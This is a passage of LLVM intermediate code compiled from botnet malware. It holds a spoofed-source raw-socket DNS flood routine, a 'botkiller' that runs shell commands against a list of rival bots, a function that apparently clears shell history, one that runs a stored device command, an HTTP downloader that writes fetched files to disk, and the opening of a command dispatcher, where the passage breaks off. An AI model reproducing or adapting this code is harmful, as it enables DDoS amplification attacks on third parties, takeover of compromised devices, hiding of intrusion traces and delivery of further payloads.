  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  %104 = load i32, i32* %103, align 4
  %105 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %106 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %105, i32 0, i32 9
  store i32 %104, i32* %106, align 4
  %107 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %108 = bitcast i8* %107 to i16*
  %109 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* %108, i32 %112)
  %114 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 7
  store i16 %113, i16* %115, align 2
  %116 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %117 = getelementptr inbounds i8, i8* %116, i64 20
  %118 = bitcast i8* %117 to %struct.udphdr*
  store %struct.udphdr* %118, %struct.udphdr** %19, align 8
  %119 = load i32, i32* %6, align 4
  %120 = trunc i32 %119 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #13
  %122 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %123 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.3* %123 to %struct.anon.4*
  %125 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %124, i32 0, i32 0
  store i16 %121, i16* %125, align 2
  %126 = call zeroext i16 @htons(i16 zeroext 53) #13
  %127 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %128 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.3* %128 to %struct.anon.4*
  %130 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %129, i32 0, i32 1
  store i16 %126, i16* %130, align 2
  %131 = load i8*, i8** %11, align 8
  %132 = call i64 @strlen(i8* %131) #10
  %133 = add i64 %132, 1
  %134 = add i64 20, %133
  %135 = add i64 %134, 4
  %136 = trunc i64 %135 to i16
  %137 = call zeroext i16 @htons(i16 zeroext %136) #13
  %138 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %139 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %138, i32 0, i32 0
  %140 = bitcast %union.anon.3* %139 to %struct.anon.4*
  %141 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %140, i32 0, i32 2
  store i16 %137, i16* %141, align 2
  %142 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %143 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %142, i32 0, i32 0
  %144 = bitcast %union.anon.3* %143 to %struct.anon.4*
  %145 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %144, i32 0, i32 3
  store i16 0, i16* %145, align 2
  %146 = load i8*, i8** %5, align 8
  %147 = call i32 @inet_addr(i8* %146) #2
  %148 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 0
  store i32 %147, i32* %148, align 4
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %150 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 4
  %152 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 1
  store i32 %151, i32* %152, align 4
  %153 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 2
  store i8 0, i8* %153, align 4
  %154 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 3
  store i8 17, i8* %154, align 1
  %155 = load i8*, i8** %11, align 8
  %156 = call i64 @strlen(i8* %155) #10
  %157 = add i64 %156, 1
  %158 = add i64 20, %157
  %159 = add i64 %158, 4
  %160 = trunc i64 %159 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #13
  %162 = getelementptr inbounds %struct.ps_hdr, %struct.ps_hdr* %20, i32 0, i32 4
  store i16 %161, i16* %162, align 2
  %163 = load i8*, i8** %11, align 8
  %164 = call i64 @strlen(i8* %163) #10
  %165 = add i64 %164, 1
  %166 = add i64 32, %165
  %167 = add i64 %166, 4
  %168 = trunc i64 %167 to i32
  store i32 %168, i32* %21, align 4
  %169 = load i32, i32* %21, align 4
  %170 = sext i32 %169 to i64
  %171 = call noalias i8* @malloc(i64 %170) #2
  store i8* %171, i8** %16, align 8
  %172 = load i8*, i8** %16, align 8
  %173 = bitcast %struct.ps_hdr* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %172, i8* %173, i64 12, i32 1, i1 false)
  %174 = load i8*, i8** %16, align 8
  %175 = getelementptr inbounds i8, i8* %174, i64 12
  %176 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %177 = bitcast %struct.udphdr* %176 to i8*
  %178 = load i8*, i8** %11, align 8
  %179 = call i64 @strlen(i8* %178) #10
  %180 = add i64 %179, 1
  %181 = add i64 20, %180
  %182 = add i64 %181, 4
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %175, i8* %177, i64 %182, i32 1, i1 false)
  %183 = load i8*, i8** %16, align 8
  %184 = bitcast i8* %183 to i16*
  %185 = load i32, i32* %21, align 4
  %186 = call zeroext i16 @csum(i16* %184, i32 %185)
  %187 = load %struct.udphdr*, %struct.udphdr** %19, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 0
  %189 = bitcast %union.anon.3* %188 to %struct.anon.4*
  %190 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %189, i32 0, i32 3
  store i16 %186, i16* %190, align 2
  %191 = call i32 @socket(i32 2, i32 3, i32 255) #2
  store i32 %191, i32* %22, align 4
  %192 = load i32, i32* %22, align 4
  %193 = icmp eq i32 %192, -1
  br i1 %193, label %194, label %195

; <label>:194:                                    ; preds = %4
  br label %211

; <label>:195:                                    ; preds = %4
  %196 = load i32, i32* %22, align 4
  %197 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %198 = load %struct.iphdr*, %struct.iphdr** %18, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  %200 = load i16, i16* %199, align 2
  %201 = zext i16 %200 to i64
  %202 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %203 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %203, %struct.sockaddr** %202, align 8
  %204 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %205 = load %struct.sockaddr*, %struct.sockaddr** %204, align 8
  %206 = call i64 @sendto(i32 %196, i8* %197, i64 %201, i32 0, %struct.sockaddr* %205, i32 16)
  br label %207

; <label>:207:                                    ; preds = %195
  %208 = load i8*, i8** %16, align 8
  call void @free(i8* %208) #2
  %209 = load i32, i32* %22, align 4
  %210 = call i32 @close(i32 %209)
  br label %211

; <label>:211:                                    ; preds = %207, %194
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dnsflood(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.thread_data*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %2, align 8
  %11 = call i32 @listFork()
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %1
  ret void

; <label>:14:                                     ; preds = %1
  %15 = load i8*, i8** %2, align 8
  %16 = bitcast i8* %15 to %struct.thread_data*
  store %struct.thread_data* %16, %struct.thread_data** %3, align 8
  %17 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %18 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %17, i32 0, i32 1
  %19 = load i8*, i8** %18, align 8
  store i8* %19, i8** %4, align 8
  %20 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %21 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %20, i32 0, i32 2
  %22 = load i32, i32* %21, align 8
  store i32 %22, i32* %5, align 4
  %23 = load %struct.thread_data*, %struct.thread_data** %3, align 8
  %24 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %23, i32 0, i32 4
  %25 = load i32, i32* %24, align 8
  store i32 %25, i32* %6, align 4
  %26 = call i64 @time(i64* null) #2
  %27 = call i32 @getpid() #2
  %28 = sext i32 %27 to i64
  %29 = xor i64 %26, %28
  %30 = trunc i64 %29 to i32
  call void @init_rand(i32 %30)
  store i32 0, i32* %8, align 4
  %31 = call i64 @time(i64* null) #2
  %32 = load i32, i32* %6, align 4
  %33 = sext i32 %32 to i64
  %34 = add nsw i64 %31, %33
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %9, align 4
  br label %36

; <label>:36:                                     ; preds = %85, %14
  %37 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.419, i32 0, i32 0))
  store %struct._IO_FILE* %37, %struct._IO_FILE** %10, align 8
  br label %38

; <label>:38:                                     ; preds = %84, %36
  %39 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %40 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %41 = call i8* @fgets(i8* %39, i32 100, %struct._IO_FILE* %40)
  %42 = icmp ne i8* %41, null
  br i1 %42, label %43, label %85

; <label>:43:                                     ; preds = %38
  %44 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %45 = call i64 @strlen(i8* %44) #10
  %46 = sub i64 %45, 1
  %47 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = icmp eq i32 %49, 10
  br i1 %50, label %59, label %51

; <label>:51:                                     ; preds = %43
  %52 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %53 = call i64 @strlen(i8* %52) #10
  %54 = sub i64 %53, 1
  %55 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 13
  br i1 %58, label %59, label %64

; <label>:59:                                     ; preds = %51, %43
  %60 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  %61 = call i64 @strlen(i8* %60) #10
  %62 = sub i64 %61, 1
  %63 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 %62
  store i8 0, i8* %63, align 1
  br label %64

; <label>:64:                                     ; preds = %59, %51
  %65 = load i8*, i8** %4, align 8
  %66 = load i32, i32* %5, align 4
  %67 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i32 0, i32 0
  call void @dns_send(i8* %65, i32 %66, i8* %67, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.420, i32 0, i32 0))
  %68 = load volatile i32, i32* @pps, align 4
  %69 = add i32 %68, 1
  store volatile i32 %69, i32* @pps, align 4
  %70 = load i32, i32* %8, align 4
  %71 = load volatile i32, i32* @limiter, align 4
  %72 = icmp sge i32 %70, %71
  br i1 %72, label %73, label %76

; <label>:73:                                     ; preds = %64
  store i32 0, i32* %8, align 4
  %74 = load volatile i32, i32* @sleeptime, align 4
  %75 = call i32 @usleep(i32 %74)
  br label %76

; <label>:76:                                     ; preds = %73, %64
  %77 = load i32, i32* %8, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %8, align 4
  %79 = call i64 @time(i64* null) #2
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = icmp sgt i64 %79, %81
  br i1 %82, label %83, label %84

; <label>:83:                                     ; preds = %76
  call void @exit(i32 0) #14
  unreachable

; <label>:84:                                     ; preds = %76
  br label %38

; <label>:85:                                     ; preds = %38
  %86 = load %struct._IO_FILE*, %struct._IO_FILE** %10, align 8
  %87 = call i32 @fclose(%struct._IO_FILE* %86)
  br label %36
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

declare i32 @fclose(%struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @botkiller() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [80 x i8], align 16
  br label %3

; <label>:3:                                      ; preds = %33, %0
  store i32 0, i32* %1, align 4
  br label %4

; <label>:4:                                      ; preds = %30, %3
  %5 = load i32, i32* %1, align 4
  %6 = icmp slt i32 %5, 9
  br i1 %6, label %7, label %33

; <label>:7:                                      ; preds = %4
  %8 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %9 = call i32 (i8*, i8*, ...) @sprintf(i8* %8, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.421, i32 0, i32 0)) #2
  %10 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %11 = load i32, i32* %1, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = call i8* @strcat(i8* %10, i8* %14) #2
  %16 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %17 = call i32 @system(i8* %16)
  %18 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %19 = call i32 (i8*, i8*, ...) @sprintf(i8* %18, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.422, i32 0, i32 0)) #2
  %20 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* %1, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [193 x i8*], [193 x i8*]* @knownBots, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcat(i8* %20, i8* %24) #2
  %26 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strcat(i8* %26, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i32 0, i32 0)) #2
  %28 = getelementptr inbounds [80 x i8], [80 x i8]* %2, i32 0, i32 0
  %29 = call i32 @system(i8* %28)
  br label %30

; <label>:30:                                     ; preds = %7
  %31 = load i32, i32* %1, align 4
  %32 = add nsw i32 %31, 1
  store i32 %32, i32* %1, align 4
  br label %4

; <label>:33:                                     ; preds = %4
  %34 = call i32 @sleep(i32 5)
  br label %3
                                                  ; No predecessors!
  ret void
}

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.423, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.424, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.425, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @binsBins() #0 {
  %1 = alloca i32, align 4
  %2 = call i32 @fork() #2
  store i32 %2, i32* %1, align 4
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %0
  %5 = load i8*, i8** @rekdevice, align 8
  %6 = call i32 @system(i8* %5)
  %7 = call i32 @sleep(i32 20)
  br label %11

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %1, align 4
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.426, i32 0, i32 0), i32 %9)
  br label %11

; <label>:11:                                     ; preds = %8, %4
  ret void
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define i32 @download(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i64, align 8
  %11 = alloca [1024 x i8], align 16
  %12 = alloca %struct._IO_FILE*, align 8
  %13 = alloca [4096 x i8], align 16
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %19 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %19, i32* %6, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %2
  store i32 3, i32* %3, align 4
  br label %198

; <label>:22:                                     ; preds = %2
  %23 = load i8*, i8** %4, align 8
  %24 = call i32 @strncmp(i8* %23, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.427, i32 0, i32 0), i64 7) #10
  %25 = icmp ne i32 %24, 0
  br i1 %25, label %31, label %26

; <label>:26:                                     ; preds = %22
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %28 = load i8*, i8** %4, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 7
  %30 = call i8* @strcpy(i8* %27, i8* %29) #2
  br label %35

; <label>:31:                                     ; preds = %22
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %33 = load i8*, i8** %4, align 8
  %34 = call i8* @strcpy(i8* %32, i8* %33) #2
  br label %35

; <label>:35:                                     ; preds = %31, %26
  store i32 0, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %52, %35
  %37 = load i32, i32* %7, align 4
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %40 = call i64 @strlen(i8* %39) #10
  %41 = icmp ult i64 %38, %40
  br i1 %41, label %42, label %49

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp ne i32 %47, 47
  br label %49

; <label>:49:                                     ; preds = %42, %36
  %50 = phi i1 [ false, %36 ], [ %48, %42 ]
  br i1 %50, label %51, label %55

; <label>:51:                                     ; preds = %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %7, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %7, align 4
  br label %36

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* %7, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i64 0, i64 %57
  store i8 0, i8* %58, align 1
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = call zeroext i16 @htons(i16 zeroext 80) #13
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %60, i16* %61, align 2
  %62 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %63 = call i32 @inet_addr(i8* %62) #2
  %64 = zext i32 %63 to i64
  store i64 %64, i64* %10, align 8
  %65 = icmp eq i64 %64, -1
  br i1 %65, label %66, label %83

; <label>:66:                                     ; preds = %55
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %68 = call %struct.hostent* @gethostbyname(i8* %67)
  store %struct.hostent* %68, %struct.hostent** %14, align 8
  %69 = icmp eq %struct.hostent* %68, null
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %66
  store i32 2, i32* %3, align 4
  br label %198

; <label>:71:                                     ; preds = %66
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %73 = bitcast %struct.in_addr* %72 to i8*
  %74 = load %struct.hostent*, %struct.hostent** %14, align 8
  %75 = getelementptr inbounds %struct.hostent, %struct.hostent* %74, i32 0, i32 4
  %76 = load i8**, i8*** %75, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = load %struct.hostent*, %struct.hostent** %14, align 8
  %80 = getelementptr inbounds %struct.hostent, %struct.hostent* %79, i32 0, i32 3
  %81 = load i32, i32* %80, align 4
  %82 = sext i32 %81 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %73, i8* %78, i64 %82, i32 1, i1 false)
  br label %88

; <label>:83:                                     ; preds = %55
  %84 = load i64, i64* %10, align 8
  %85 = trunc i64 %84 to i32
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  store i32 %85, i32* %87, align 4
  br label %88

; <label>:88:                                     ; preds = %83, %71
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %90 = bitcast [8 x i8]* %89 to i8*
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 8, i32 4, i1 false)
  %91 = load i32, i32* %6, align 4
  %92 = bitcast %union.__CONST_SOCKADDR_ARG* %15 to %struct.sockaddr**
  %93 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %93, %struct.sockaddr** %92, align 8
  %94 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %15, i32 0, i32 0
  %95 = load %struct.sockaddr*, %struct.sockaddr** %94, align 8
  %96 = call i32 @connect(i32 %91, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, 0
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %88
  store i32 1, i32* %3, align 4
  br label %198

; <label>:99:                                     ; preds = %88
  %100 = load i32, i32* %6, align 4
  %101 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = getelementptr inbounds i8, i8* %104, i64 1
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %11, i32 0, i32 0
  %107 = call i32 (i32, i8*, ...) @sockprintf(i32 %100, i8* getelementptr inbounds ([132 x i8], [132 x i8]* @.str.428, i32 0, i32 0), i8* %105, i8* %106)
  %108 = load i8*, i8** %5, align 8
  %109 = call %struct._IO_FILE* @fopen(i8* %108, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.429, i32 0, i32 0))
  store %struct._IO_FILE* %109, %struct._IO_FILE** %12, align 8
  br label %110

; <label>:110:                                    ; preds = %159, %99
  %111 = load i32, i32* %6, align 4
  %112 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %113 = call i64 @recv(i32 %111, i8* %112, i64 4096, i32 0)
  %114 = trunc i64 %113 to i32
  store i32 %114, i32* %16, align 4
  %115 = icmp sle i32 %114, 0
  br i1 %115, label %116, label %117

; <label>:116:                                    ; preds = %110
  br label %160

; <label>:117:                                    ; preds = %110
  %118 = load i32, i32* %16, align 4
  %119 = icmp slt i32 %118, 4096
  br i1 %119, label %120, label %124

; <label>:120:                                    ; preds = %117
  %121 = load i32, i32* %16, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %122
  store i8 0, i8* %123, align 1
  br label %124

; <label>:124:                                    ; preds = %120, %117
  store i32 0, i32* %8, align 4
  br label %125

; <label>:125:                                    ; preds = %156, %124
  %126 = load i32, i32* %8, align 4
  %127 = load i32, i32* %16, align 4
  %128 = icmp slt i32 %126, %127
  br i1 %128, label %129, label %159

; <label>:129:                                    ; preds = %125
  %130 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8, i8* %130, i64 %132
  %134 = call i32 @strncmp(i8* %133, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.430, i32 0, i32 0), i64 4) #10
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %155, label %136

; <label>:136:                                    ; preds = %129
  %137 = load i32, i32* %8, align 4
  %138 = add nsw i32 %137, 4
  store i32 %138, i32* %8, align 4
  br label %139

; <label>:139:                                    ; preds = %151, %136
  %140 = load i32, i32* %8, align 4
  %141 = load i32, i32* %16, align 4
  %142 = icmp slt i32 %140, %141
  br i1 %142, label %143, label %154

; <label>:143:                                    ; preds = %139
  %144 = load i32, i32* %8, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %145
  %147 = load i8, i8* %146, align 1
  %148 = sext i8 %147 to i32
  %149 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %150 = call i32 @fputc(i32 %148, %struct._IO_FILE* %149)
  br label %151

; <label>:151:                                    ; preds = %143
  %152 = load i32, i32* %8, align 4
  %153 = add nsw i32 %152, 1
  store i32 %153, i32* %8, align 4
  br label %139

; <label>:154:                                    ; preds = %139
  br label %161

; <label>:155:                                    ; preds = %129
  br label %156

; <label>:156:                                    ; preds = %155
  %157 = load i32, i32* %8, align 4
  %158 = add nsw i32 %157, 1
  store i32 %158, i32* %8, align 4
  br label %125

; <label>:159:                                    ; preds = %125
  br label %110

; <label>:160:                                    ; preds = %116
  br label %161

; <label>:161:                                    ; preds = %160, %154
  br label %162

; <label>:162:                                    ; preds = %192, %161
  %163 = load i32, i32* %6, align 4
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  %165 = call i64 @recv(i32 %163, i8* %164, i64 4096, i32 0)
  %166 = trunc i64 %165 to i32
  store i32 %166, i32* %17, align 4
  %167 = icmp sle i32 %166, 0
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %162
  br label %193

; <label>:169:                                    ; preds = %162
  %170 = load i32, i32* %17, align 4
  %171 = icmp slt i32 %170, 4096
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %169
  %173 = load i32, i32* %17, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %174
  store i8 0, i8* %175, align 1
  br label %176

; <label>:176:                                    ; preds = %172, %169
  store i32 0, i32* %18, align 4
  br label %177

; <label>:177:                                    ; preds = %189, %176
  %178 = load i32, i32* %18, align 4
  %179 = load i32, i32* %17, align 4
  %180 = icmp slt i32 %178, %179
  br i1 %180, label %181, label %192

; <label>:181:                                    ; preds = %177
  %182 = load i32, i32* %18, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i64 0, i64 %183
  %185 = load i8, i8* %184, align 1
  %186 = sext i8 %185 to i32
  %187 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %188 = call i32 @fputc(i32 %186, %struct._IO_FILE* %187)
  br label %189

; <label>:189:                                    ; preds = %181
  %190 = load i32, i32* %18, align 4
  %191 = add nsw i32 %190, 1
  store i32 %191, i32* %18, align 4
  br label %177

; <label>:192:                                    ; preds = %177
  br label %162

; <label>:193:                                    ; preds = %168
  %194 = load %struct._IO_FILE*, %struct._IO_FILE** %12, align 8
  %195 = call i32 @fclose(%struct._IO_FILE* %194)
  %196 = load i32, i32* %6, align 4
  %197 = call i32 @close(i32 %196)
  store i32 0, i32* %3, align 4
  br label %198

; <label>:198:                                    ; preds = %193, %98, %70, %21
  %199 = load i32, i32* %3, align 4
  ret i32 %199
}

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8*, i8*, i64) #1

declare %struct.hostent* @gethostbyname(i8*) #3

declare i32 @fputc(i32, %struct._IO_FILE*) #3

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i32, align 4
  %41 = alloca i8*, align 8
  %42 = alloca i8*, align 8
